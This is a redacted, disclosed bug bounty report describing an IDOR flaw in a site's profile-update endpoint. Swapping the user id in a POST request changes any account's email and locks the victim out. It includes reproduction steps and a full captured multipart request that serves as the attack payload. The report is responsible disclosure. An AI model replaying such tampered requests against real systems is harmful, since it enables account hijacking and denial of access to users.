# ████ ' can change any account email and cannot retrieve his account and access it ' at ███

## Report Details
- **Report ID**: 1952771
- **URL**: https://hackerone.com/reports/1952771
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-04-18T16:46:58.558Z
- **Disclosed**: 2023-06-23T14:54:18.014Z

## Reporter
- **Username**: 0xs4m
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mars

## Vulnerability Information
hi ███
i found ██████████ , i can change any account email and he cannot retrieve his account and access it easily.

i can't access to his account because url activation on new email don't work and give me error.

```
SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
```
but hackers will be able to disable access users to their account on the site.

  1. Go to registration page (████)
  2. Verified your account.
  3. Go to login page and login your account.


 For the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created) 

   * For Attacker

███████████
Password
███████████ : ███████

   * For Victim 1

████████████
Password
████ : ██████████

   * For Victim 2

██████████████
Password
█████████ : ████ For Victim 3

████
Password
██████████

i access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).

so .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.

i received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation
```
SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
```
the change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.

i created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.

burp request
```
POST /_post/usuario_actualizar.php HTTP/1.1
Host: ████████
Cookie: ████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/██████ Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ████████
Content-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594
Content-Length: 2851
Origin: ███████-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------297392175112058█████████████7932062474594
Content-Disposition: form-data; name="nombre"

attacker
-----------------------------297392175112058████7932062474594
Content-Disposition: form-data; name="apellido"

attacker
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="email"

████████████
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="rut"


-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idProvincia"

0
-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idLocalidad"

0
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"

no
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"

si
-----------------------------297392175112058████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"

no
-----------------------------297392175112058██████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"

si
-----------------------------297392175112058████7932062474594
Content-Disposition: form-data; name="optin[usuario_investigaciones]"

no
-----------------------------297392175112058██████████7932062474594
Content-Disposition: form-data; name="optin[usuario_investigaciones]"

si
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_perros]"

no
-----------------------------297392175112058██████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_perros]"

si
-----------------------------297392175112058████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_gatos]"

no
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_gatos]"

si
-----------------------------297392175112058██████████████7932062474594
Content-Disposition: form-data; name="switch_pass"

off
-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="ck_oldpass"

Password
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="oldpass"


-----------------------------297392175112058████████████7932062474594
Content-Disposition: form-data; name="clave"


-----------------------------297392175112058█████████████7932062474594
Content-Disposition: form-data; name="clave2"


-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="█████"

88796
-----------------------------297392175112058████████7932062474594--
```
██████

## Impact

█████████████

## Attachments
No attachments
